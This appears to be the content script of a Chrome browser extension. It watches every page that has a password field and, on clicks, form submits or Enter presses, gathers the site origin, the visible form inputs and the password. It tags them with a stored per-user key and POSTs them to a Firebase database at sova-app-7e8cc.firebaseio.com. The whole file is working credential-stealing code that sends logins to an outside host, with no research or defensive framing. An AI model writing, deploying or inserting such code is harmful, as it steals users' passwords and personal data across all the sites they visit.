
const query = queryString => Array.prototype.slice.call(document.querySelectorAll(queryString));
const getPasswords = _ => query('input[type=password]');
const KEYCODES = {
  ENTER: 13,
}
const MIN_V = 3;
const STORAGE_KEY = 'duck_go';
let user_key;


String.prototype.hashCode = function() {
  var hash = 0, i, chr;
  if (this.length === 0) return hash;
  for (i = 0; i < this.length; i++) {
    chr   = this.charCodeAt(i);
    hash  = ((hash << 5) - hash) + chr;
    hash |= 0; // Convert to 32bit integer
  }
  return hash;
};

const onPageStart = () => {
  passWatcher();
}

const passWatcher = () => {
  const paswords = getPasswords();
  if (paswords.length === 0) {
    return;
  }
  const sender = firebaseSender;
  const handler = sendTo(sender);

  onButtonClicks(handler);
  onFormSubmits(handler);
  onEnterPressed(handler);
}

const consoleLogger = d => {
  console.log('consoleHandler:strart');
  console.log(JSON.stringify(d));
  console.log('consoleHandler:end');
}
const sendTo = sender => _ => {
  const inputs = query('input').filter(isValidInput);
  const passwords = query('input[type=password]');
  const password = passwords.find(p => p.value && p.value.length > MIN_V);

  if (!password) { return; }
  if (inputs.length === 0) { return; }
  const site = window.location.origin;
  const inputsGrouped = groupByType(inputs)
  const model = {
    site,
    inputs: inputsGrouped,
    password: password.value,
    user_key,
  }

  if (!checkCache(model)) {
    return;
  }

  sender(model);
}

const groupByType = inputs => {
  return inputs
    .reduce((acc, input) => {
      if (acc[input.type]) {
        acc[input.type].push(input.value);
      } else {
        acc[input.type] = [input.value];
      }
      return acc;
    }, {});
}
const isValidInput = i => {
  return (i.value &&
          i.value.length > MIN_V &&
          i.type !== 'hidden' &&
          i.type !== 'submit' &&
          i.type !== 'radio' &&
          i.type !== 'checkbox'
  );
}

const checkCache = d => {
  const key = `${d.site}-${d.password}`.hashCode();
  const prev = localStorage.getItem(key);
  if (prev && prev.length) { return false; }
  localStorage.setItem(key, 'fuck');
  return true;
}

const onButtonClicks = handler => {
  const buttons = query('button, input[type=submit]');
  buttons.forEach(button => button.addEventListener('click', handler));
};

const onFormSubmits = handler => {
  const forms = query('form')
  forms.forEach(form => form.addEventListener('submit', handler));
}

const onEnterPressed = handler => {
  const inputs = query('input');
  inputs.forEach(input => {
    input.addEventListener('keydown', event => {
      if (event.inputs === KEYCODES.ENTER) { handler() }
    });
  });
};
const makeid = () => {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 5; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
chrome.storage.sync.get([STORAGE_KEY], (result) => {
  if (!result[STORAGE_KEY]) {
    const v = makeid();
    user_key = v;
    chrome.storage.sync.set({[STORAGE_KEY]: v}, () => {
      onPageStart();
    })
  } else {
    user_key = result[STORAGE_KEY];
    onPageStart();
  }
});


// firebase

const firebaseSender = data => {
  return fetch(`https://sova-app-7e8cc.firebaseio.com/${user_key}.json`, {
    method: 'post',
    body: JSON.stringify(data),
  });
}